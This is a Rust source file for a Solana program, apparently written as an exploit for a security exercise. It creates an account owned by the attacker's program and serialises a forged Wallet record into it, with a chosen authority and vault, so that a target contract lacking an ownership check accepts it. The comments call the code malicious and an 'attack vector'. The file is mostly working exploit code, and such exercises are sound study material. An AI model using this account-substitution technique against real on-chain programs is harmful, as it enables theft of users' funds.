use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    entrypoint,
//  msg,
    program::{invoke},
//    program_error::ProgramError,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction,
    sysvar::Sysvar,
};

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
    pub vault: Pubkey,
}

pub const WALLET_LEN: u64 = 32 + 32;

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    initialize(program_id, accounts)
}


fn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
// The aim of this instruction is to make (wallet_info) owned by a different program
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let vault_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let rent_info = next_account_info(account_info_iter)?;

    // We are writing malicious code not safe code, lol

    // let (wallet_address, wallet_seed) =
    //     Pubkey::find_program_address(&[&authority_info.key.to_bytes()], program_id);
    // let (vault_address, _) = Pubkey::find_program_address(
    //     &[&authority_info.key.to_bytes(), &"VAULT".as_bytes()],
    //     program_id,
    // );

    let rent = Rent::from_account_info(rent_info)?;

    // assert_eq!(*wallet_info.key, wallet_address);
    // assert!(wallet_info.data_is_empty());

    // We create our own account owned by us(this program) so that we can put our attack vector in it
    invoke(
        &system_instruction::create_account(
            &authority_info.key,
            &wallet_info.key,
            rent.minimum_balance(WALLET_LEN as usize),
            WALLET_LEN,
            &program_id,
        ),
        &[authority_info.clone(), wallet_info.clone()],
    )?;

    // This is already created by system program and owned  by the program(contract) we intend to attack
    // invoke_signed(
    //     &system_instruction::create_account(
    //         &authority_info.key,
    //         &vault_address,
    //         rent.minimum_balance(0),
    //         0,
    //         &program_id,
    //     ),
    //     &[authority_info.clone(), vault_info.clone()],
    //     &[&[
    //         &authority_info.key.to_bytes(),
    //         &"VAULT".as_bytes(),
    //         &[vault_seed],
    //     ]],
    // )?;

    let wallet = Wallet {
        authority: *authority_info.key,
        vault: *vault_info.key,
    };

    // We input our malicious code in here
    wallet
        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
        .unwrap();

    Ok(())
}

